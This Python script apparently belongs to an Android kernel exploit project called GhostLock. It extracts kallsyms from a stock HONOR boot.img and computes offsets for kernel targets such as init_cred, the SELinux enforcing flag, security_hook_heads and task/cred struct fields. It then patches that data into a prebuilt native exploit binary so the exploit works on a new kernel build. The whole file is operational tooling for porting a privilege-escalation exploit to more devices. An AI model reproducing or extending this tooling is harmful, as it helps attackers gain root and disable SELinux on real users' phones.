#!/usr/bin/env python3
"""Add a new HONOR 5.4.289-qgki kernel build to the GhostLock App.

The native exploit (`assets/ghostlock`) is a prebuilt AArch64 PIE whose
`known_offsets[]` table is compiled in.  This tool derives a precise
OFFSETS_ENTRY from a stock boot.img (no root, no vmlinux, no NDK needed),
then produces a *patched copy* of the exploit where one existing table slot
is replaced by the new kernel.  The original binary is never modified, so
all previously supported kernels stay available.

Pipeline:
  boot.img (v3) -> raw kernel Image -> embedded kallsyms (BASE_RELATIVE)
  -> per-field offsets (VA - _text) -> struct kernel_offsets bytes -> ELF patch

Usage:
  python tools/add_boot_img_kernel.py <boot.img> \
      --binary  GhostLockApp/app/src/main/assets/ghostlock \
      --out     GhostLockApp/app/src/main/assets/ghostlock_<tag> \
      --replace 5.4.295-qgki-g0fb2656b2b50 \
      --entry-out tools/out/new_offsets_entry.h
"""
from __future__ import annotations

import argparse
import re
import struct
import sys
from pathlib import Path

KIMAGE = 0xFFFFFFC010080000
KERNEL_PHYS_LOAD = 0x128000000  # SM8350 lahaina, from /proc/iomem on a rooted unit
IDENT = re.compile(r"^[A-Za-z_.$0-9]+$")

# struct kernel_offsets (src/devices/offsets.h), AArch64 LP64, size 448.
U64 = {
    "kernel_phys_load": 8, "phys_offset": 16,
    "off_init_task": 24, "off_init_cred": 32, "off_init_uts_ns": 40,
    "off_empty_zero_page": 48, "off_root_task_group": 56,
    "off_selinux_enforcing": 64, "off_sig_enforce": 72,
    "off_kptr_restrict": 80, "off_selinux_blob_sizes": 88,
    "off_security_hook_heads": 96, "off_kmalloc_caches": 104,
    "off_anon_pipe_buf_ops": 112, "off_ashmem_misc_fops": 120,
    "off_ashmem_fops": 128, "off_ashmem_ioctl": 136,
    "off_ashmem_compat_ioctl": 144, "off_ashmem_mmap": 152,
    "off_ashmem_open": 160, "off_ashmem_release": 168,
    "off_ashmem_show_fdinfo": 176, "off_configfs_read_iter": 184,
    "off_configfs_bin_write_iter": 192, "off_copy_splice_read": 200,
    "off_noop_llseek": 208, "off_cap_capable_active": 216,
    "off_slide_nfulnl_logger": 224, "off_slide_loggers_0_1": 232,
    "off_slide_boot_id": 240, "off_system_unbound_wq": 248,
    "off_call_usermodehelper_exec_work": 256,
    "kimage_text_base": 336,
}
U32 = {
    "task_prio": 264, "task_normal_prio": 268, "task_sched_task_group": 272,
    "task_pi_lock": 276, "task_pi_waiters": 280, "task_pi_top_task": 284,
    "task_pi_blocked_on": 288, "task_pid": 292, "task_tgid": 296,
    "task_real_parent": 300, "task_atomic_flags": 304,
    "task_real_cred": 308, "task_cred": 312, "task_comm": 316,
    "task_tasks": 320, "task_seccomp": 324, "mm_owner": 328,
    "waiter_compact": 332,
    "fops_llseek": 344, "fops_read": 348, "fops_write": 352,
    "fops_read_iter": 356, "fops_write_iter": 360, "fops_ioctl": 364,
    "fops_compat_ioctl": 368, "fops_mmap": 372, "fops_open": 376,
    "fops_release": 380, "fops_splice_read": 384, "fops_show_fdinfo": 388,
    "cfg_page_off": 392, "cfg_needs_read_fill_off": 396,
    "cfg_bin_buffer_off": 400, "cfg_bin_buffer_size_off": 404,
    "cfg_cb_max_size_off": 408, "cred_uid_off": 412,
    "cred_securebits_off": 416, "cred_caps_off": 420,
    "cred_security_off": 424, "task_usage": 428, "fops_no_iter": 432,
    "mcast_route": 436, "dm_va_absolute": 440,
}
ENTRY_SIZE = 448


def read_boot_kernel(path: Path) -> bytes:
    d = path.read_bytes()
    if d[:8] == b"ANDROID!":
        ks = struct.unpack_from("<I", d, 8)[0]
        if not (0 < ks <= len(d) - 4096):
            sys.exit("bad boot v3 kernel_size")
        return d[4096:4096 + ks]
    return d


def parse_kallsyms_impl(img: bytes, ref: dict | None = None):
    """Return ({symbol: VA-KIMAGE}, sorted [(VA-KIMAGE, symbol), ...]).

    `ref` is an optional /proc/kallsyms-style table from an already adapted
    kernel of the same family; exact address matches are used to pick the
    correct 4-byte alignment of kallsyms_offsets (several alignments make
    `_text` land on KIMAGE because the head of the table is all zeros).

    The sorted list keeps every symbol (including duplicates at the same
    address) and is what adjacent-symbol bounds need: a span is
    [symbol_start, next_symbol_start).
    """
    u16 = lambda o: struct.unpack_from("<H", img, o)[0]
    u32 = lambda o: struct.unpack_from("<I", img, o)[0]
    n = len(img)

    # 1) kallsyms_markers: 4-aligned ascending u32 array starting at 0
    mo = None
    o = 0
    while o + 4 <= n:
        if img[o:o + 4] == b"\0\0\0\0":
            run, p, prev = 1, o + 4, 0
            while p + 4 <= n and run < 4096:
                v, delta = u32(p), u32(p) - prev
                if delta <= 32 or delta > 20000:
                    break
                run, prev, p = run + 1, v, p + 4
            if run >= 128:
                mo, mc = o, run
                break
        o += 4
    if mo is None:
        sys.exit("kallsyms_markers not found")
    markers = [u32(mo + 4 * i) for i in range(mc)]

    # 2) kallsyms_token_table (256 NUL strings) + kallsyms_token_index
    ts = (mo + 4 * mc + 7) & ~7
    p, toks = ts, []
    for _ in range(256):
        q = img.find(b"\0", p, p + 512)
        if q < 0:
            sys.exit("token table truncated")
        toks.append(img[p:q])
        p = q + 1
    ti = None
    for cand in range(p, p + 32):
        vals = [u16(cand + 2 * i) for i in range(256)]
        if (vals[0] == 0 and vals[1] == len(toks[0]) + 1
                and all(vals[i] < vals[i + 1] for i in range(255))):
            ti = cand
            break
    if ti is None:
        sys.exit("kallsyms_token_index not found")

    def rec(q):
        ln = img[q]
        q += 1
        if ln & 0x80:
            ln = (ln & 0x7F) | (img[q] << 7)
            q += 1
        return ln, q

    def decode(q, ln):
        return b"".join(toks[b] for b in img[q:q + ln]).decode("latin1")

    # 3) names start: walking 256 records must land exactly on markers[1]
    lo, ns = max(0, mo - (8 << 20)), None
    p = lo
    while p < mo:
        ln, q = rec(p)
        if not (1 <= ln <= 64) or q + ln > mo:
            p += 1
            continue
        name = decode(q, ln)
        if not IDENT.match(name) or name[0] not in "TtDdBbRrAaWwVvNnUuGgSs":
            p += 1
            continue
        qq, ok = p, True
        for _ in range(256):
            l2, qq = rec(qq)
            if not (1 <= l2 <= 512) or qq + l2 > n:
                ok = False
                break
            qq += l2
        if ok and (qq - p) == markers[1]:
            ns = p
            break
        p += 1
    if ns is None:
        sys.exit("kallsyms_names start not found")

    q, count, positions, names = ns, 0, [], []
    while q < mo - 4:
        start = q
        ln, q2 = rec(q)
        if count % 256 == 0:
            positions.append(start - ns)
        names.append(decode(q2, ln))
        q, count = q2 + ln, count + 1
    if positions[:mc] != markers:
        sys.exit("markers mismatch")
    print(f"[kallsyms] num_syms={count} names@{ns:#x} markers@{mo:#x}")

    # 4) kallsyms_offsets: u32 array right before names; pick the alignment
    #    that makes _text land exactly on KIMAGE (validated by symbol matches).
    best = None
    for shift in range(0, 40, 4):
        s = ns - 4 * count - shift
        if s < 0:
            continue
        vals = [u32(s + 4 * i) for i in range(count)]
        sv = [v - (1 << 32) if v >= 0x80000000 else v for v in vals]
        try:
            itext = next(i for i, raw in enumerate(names) if raw[1:] == "_text")
        except StopIteration:
            continue
        base = KIMAGE - sv[itext]
        if base != KIMAGE:
            continue
        sym = {}
        entries = []
        for i, raw in enumerate(names):
            nm = raw[1:].split("$")[0]
            if nm.endswith(".cfi_jt") or not nm:
                continue
            a = sv[i]
            entries.append((a, nm))
            if nm not in sym or a < sym[nm]:
                sym[nm] = a
        matches = (sum(1 for k, v in ref.items() if k in sym and sym[k] == v)
                   if ref else (1 if shift == 20 else 0))
        if best is None or matches > best[0]:
            best = (matches, shift, s, base, sym, entries)
        if ref:
            print(f"  shift={shift:2d} exact_ref_matches={matches}")
    if best is None:
        sys.exit("cannot align kallsyms_offsets to _text / KIMAGE")
    matches, shift, s, base, sym, entries = best
    if ref and matches < 10000:
        sys.exit(f"offsets alignment looks wrong (only {matches} reference matches)")
    print(f"[kallsyms] offsets@{s:#x} relative_base={base:#x} "
          f"names={len(sym)} exact_ref_matches={matches}")
    return sym, sorted(entries)


def parse_kallsyms(img: bytes, ref: dict | None = None) -> dict:
    """Backwards-compatible wrapper: {symbol: VA-KIMAGE}."""
    return parse_kallsyms_all(img, ref)[0]


def parse_kallsyms_all(img: bytes, ref: dict | None = None):
    """Return ({symbol: VA-KIMAGE}, sorted [(VA-KIMAGE, symbol), ...]).

    The sorted list keeps every symbol (including duplicates at the same
    address) and is what adjacent-symbol bounds need: a span is
    [symbol_start, next_symbol_start).
    """
    return parse_kallsyms_impl(img, ref)


def find_boot_id(img: bytes) -> int:
    """sysctl 'boot_id' entry: str ptr +0x18 -> bss buffer VA."""
    img_end = KIMAGE + len(img)
    start = 0
    while True:
        f = img.find(b"boot_id\0", start)
        if f < 0:
            break
        start = f + 1
        pat = struct.pack("<Q", KIMAGE + f)
        g = 0
        while True:
            g = img.find(pat, g)
            if g < 0:
                break
            vd = struct.unpack("<Q", img[g + 0x18:g + 0x20])[0]
            if img_end <= vd < KIMAGE + 0x20000000:
                return vd - KIMAGE
            g += 1
    sys.exit("boot_id bss pointer not found")


def derive(sym: dict, img: bytes) -> dict:
    need = ("init_task", "init_cred", "init_uts_ns", "empty_zero_page",
            "root_task_group", "selinux_state", "sig_enforce", "kptr_restrict",
            "selinux_blob_sizes", "security_hook_heads", "kmalloc_caches",
            "anon_pipe_buf_ops", "ashmem_misc", "ashmem_fops", "ashmem_ioctl",
            "ashmem_mmap", "ashmem_open", "ashmem_release",
            "ashmem_show_fdinfo", "configfs_read_file", "configfs_write_bin_file",
            "noop_llseek", "nfulnl_logger", "loggers", "system_unbound_wq",
            "call_usermodehelper_exec_work")
    miss = [k for k in need if k not in sym]
    if miss:
        sys.exit("missing kallsyms symbols: " + ", ".join(miss))
    splice = sym.get("copy_splice_read", sym.get("default_file_splice_read"))
    if splice is None:
        sys.exit("missing splice-read symbol")
    f = {k: 0 for k in list(U64) + list(U32)}
    f.update({
        "kernel_phys_load": KERNEL_PHYS_LOAD,
        "off_init_task": sym["init_task"],
        "off_init_cred": sym["init_cred"],
        "off_init_uts_ns": sym["init_uts_ns"],
        "off_empty_zero_page": sym["empty_zero_page"],
        "off_root_task_group": sym["root_task_group"],
        "off_selinux_enforcing": sym["selinux_state"] + 1,
        "off_sig_enforce": sym["sig_enforce"],
        "off_kptr_restrict": sym["kptr_restrict"],
        "off_selinux_blob_sizes": sym["selinux_blob_sizes"],
        "off_security_hook_heads": sym["security_hook_heads"],
        "off_kmalloc_caches": sym["kmalloc_caches"],
        "off_anon_pipe_buf_ops": sym["anon_pipe_buf_ops"],
        "off_ashmem_misc_fops": sym["ashmem_misc"],
        "off_ashmem_fops": sym["ashmem_fops"],
        "off_ashmem_ioctl": sym["ashmem_ioctl"],
        "off_ashmem_compat_ioctl": sym["ashmem_ioctl"],
        "off_ashmem_mmap": sym["ashmem_mmap"],
        "off_ashmem_open": sym["ashmem_open"],
        "off_ashmem_release": sym["ashmem_release"],
        "off_ashmem_show_fdinfo": sym["ashmem_show_fdinfo"],
        "off_configfs_read_iter": sym["configfs_read_file"],
        "off_configfs_bin_write_iter": sym["configfs_write_bin_file"],
        "off_copy_splice_read": splice,
        "off_noop_llseek": sym["noop_llseek"],
        "off_cap_capable_active": 0,
        "off_slide_nfulnl_logger": sym["nfulnl_logger"],
        "off_slide_loggers_0_1": sym["loggers"] + 0x10,
        "off_slide_boot_id": find_boot_id(img),
        "off_system_unbound_wq": sym["system_unbound_wq"],
        "off_call_usermodehelper_exec_work": sym["call_usermodehelper_exec_work"],
        "kimage_text_base": KIMAGE,
    })
    # STRUCT_OFFSETS_5_4 + FNE 5.4 config/cred/fops layout
    f.update({
        "task_prio": 0x11C, "task_normal_prio": 0x124,
        "task_sched_task_group": 0x438, "task_pi_lock": 0x96C,
        "task_pi_waiters": 0x978, "task_pi_top_task": 0x988,
        "task_pi_blocked_on": 0x990, "task_pid": 0x6C0,
        "task_tgid": 0x6C4, "task_real_parent": 0x6D0,
        "task_atomic_flags": 0x688, "task_real_cred": 0x878,
        "task_cred": 0x880, "task_comm": 0x890, "task_tasks": 0x4A0,
        "task_seccomp": 0x770, "mm_owner": 0x748, "waiter_compact": 1,
        "fops_llseek": 0x08, "fops_read": 0x10, "fops_write": 0x18,
        "fops_read_iter": 0x20, "fops_write_iter": 0x28,
        "fops_ioctl": 0x50, "fops_compat_ioctl": 0x58, "fops_mmap": 0x60,
        "fops_open": 0x70, "fops_release": 0x80,
        "fops_splice_read": 0xC8, "fops_show_fdinfo": 0xE0,
        "cfg_page_off": 0x10, "cfg_needs_read_fill_off": 0x48,
        "cfg_bin_buffer_off": 0x50, "cfg_bin_buffer_size_off": 0x58,
        "cfg_cb_max_size_off": 0x5C, "cred_uid_off": 4,
        "cred_securebits_off": 0x24, "cred_caps_off": 0x28,
        "cred_security_off": 0x78, "task_usage": 0x30,
        "fops_no_iter": 1, "mcast_route": 1, "dm_va_absolute": 1,
    })
    return f


def entry_text(uname: str, f: dict) -> str:
    lines = [f'/* Added from a stock boot.img by tools/add_boot_img_kernel.py.',
             f' * Offsets are VA - kimage_text_base ({KIMAGE:#x}); do not copy the',
             f' * 5.4.289-gf6cb1f712a6e entry blindly: text/data clusters shifted. */',
             f'OFFSETS_ENTRY("{uname}",',
             f'  .kernel_phys_load={KERNEL_PHYS_LOAD:#x}, STRUCT_OFFSETS_5_4,',
             f'  .kimage_text_base={KIMAGE:#x}ULL,']
    for k, o in sorted(U64.items(), key=lambda kv: kv[1]):
        if k in ("kernel_phys_load", "kimage_text_base", "phys_offset"):
            continue
        lines.append(f"  .{k}=0x{f[k]:08X},")
    for k, o in sorted(U32.items(), key=lambda kv: kv[1]):
        v = f[k]
        lines.append(f"  .{k}={'0x%X' % v if v > 9 else v},")
    lines.append("),")
    return "\n".join(lines)


def load_reference(path: Path) -> dict:
    out = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        try:
            a = int(parts[0], 16) - KIMAGE
        except ValueError:
            continue
        nm = parts[2].split("$")[0]
        if nm.endswith(".cfi_jt"):
            continue
        if nm not in out or a < out[nm]:
            out[nm] = a
    return out


def patch(src: Path, dst: Path, replace: str, uname: str, f: dict) -> None:
    d = bytearray(src.read_bytes())
    if d[:4] != b"\x7fELF":
        sys.exit("not an ELF")
    e_shoff = struct.unpack_from("<Q", d, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", d, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", d, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", d, 0x3E)[0]
    secs = []
    for i in range(e_shnum):
        o = e_shoff + i * e_shentsize
        nm, typ, flags, addr, off, size, link, info, align, es = struct.unpack_from("<IIQQQQIIQQ", d, o)
        secs.append(dict(nm=nm, addr=addr, off=off, size=size))
    strtab = secs[e_shstrndx]
    def sname(x):
        s = d[strtab["off"] + x:d.find(b"\0", strtab["off"] + x)]
        return s.decode("ascii", "replace")
    for s in secs:
        s["sname"] = sname(s["nm"])
    dr = next(s for s in secs if s["sname"] == ".data.rel.ro")
    rela = next(s for s in secs if s["sname"] == ".rela.dyn")

    old = replace.encode("ascii")
    new = uname.encode("ascii")
    if len(old) != len(new):
        sys.exit("uname strings must have equal length for an in-place patch")
    hits = [i for i in range(len(d)) if d.startswith(old, i)]
    if len(hits) != 1:
        sys.exit(f"expected exactly one '{replace}', found {len(hits)}")
    str_fo = hits[0]
    # .rodata is stored with addr == off in this PIE; verify generically
    str_va = None
    for s in secs:
        if s["off"] <= str_fo < s["off"] + s["size"] and s["addr"]:
            str_va = s["addr"] + str_fo - s["off"]
    if str_va is None:
        sys.exit("cannot map uname string to a VA")

    target_va = None
    for i in range(rela["size"] // 24):
        o = rela["off"] + i * 24
        r_off, r_info, r_add = struct.unpack_from("<QQq", d, o)
        if r_add == str_va and (r_info & 0xFFFFFFFF) == 0x403:
            target_va = r_off
            break
    if target_va is None:
        sys.exit("no R_AARCH64_RELATIVE relocation points at the uname string")
    entry_fo = dr["off"] + target_va - dr["addr"]
    print(f"[elf] replace slot VA={target_va:#x} file@{entry_fo:#x}, string@{str_fo:#x}")

    d[str_fo:str_fo + len(old)] = new
    for k, o in U64.items():
        struct.pack_into("<Q", d, entry_fo + o, f[k] & 0xFFFFFFFFFFFFFFFF)
    for k, o in U32.items():
        struct.pack_into("<I", d, entry_fo + o, f[k] & 0xFFFFFFFF)
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(d)

    # verify what actually landed on disk
    v = dst.read_bytes()
    assert v[str_fo:str_fo + len(new)] == new
    assert struct.unpack_from("<Q", v, entry_fo + 24)[0] == f["off_init_task"]
    assert struct.unpack_from("<Q", v, entry_fo + 336)[0] == KIMAGE
    assert struct.unpack_from("<I", v, entry_fo + 440)[0] == 1
    assert len(v) == len(d)
    print(f"[elf] wrote {dst} ({len(v)} bytes), verified")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("boot", type=Path)
    ap.add_argument("--binary", type=Path, required=True)
    ap.add_argument("--out", type=Path, required=True)
    ap.add_argument("--replace", default="5.4.295-qgki-g0fb2656b2b50")
    ap.add_argument("--entry-out", type=Path, default=None)
    ap.add_argument("--reference", type=Path, default=None,
                    help="known-good kallsyms text of the same kernel family")
    a = ap.parse_args()

    kernel = read_boot_kernel(a.boot)
    print(f"[boot] kernel Image {len(kernel)} bytes")
    # init_uts_ns holds the release as a standalone NUL-terminated string in
    # the sysctl table; "Linux version ..." is a longer format string, skip it.
    uname, seen = "", set()
    for m in re.finditer(rb"qgki-g", kernel):
        s = kernel.rfind(b"\0", 0, m.start()) + 1
        e = kernel.find(b"\0", m.start())
        cand = kernel[s:e].decode("ascii", "replace")
        if re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+-[A-Za-z0-9._-]{1,80}", cand):
            seen.add(cand)
            uname = cand
    if not uname or len(seen) != 1:
        sys.exit(f"cannot determine a unique uname -r from the Image: {sorted(seen)}")
    print(f"[boot] uname -r = {uname}")
    ref = load_reference(a.reference) if a.reference else None
    sym = parse_kallsyms(kernel, ref)
    f = derive(sym, kernel)
    print(f"[offsets] init_task={f['off_init_task']:#x} "
          f"selinux_enforcing={f['off_selinux_enforcing']:#x} "
          f"boot_id={f['off_slide_boot_id']:#x}")
    text = entry_text(uname, f)
    print("\n" + text + "\n")
    if a.entry_out:
        a.entry_out.parent.mkdir(parents=True, exist_ok=True)
        a.entry_out.write_text(text + "\n", encoding="utf-8")
    patch(a.binary, a.out, a.replace, uname, f)


if __name__ == "__main__":
    main()
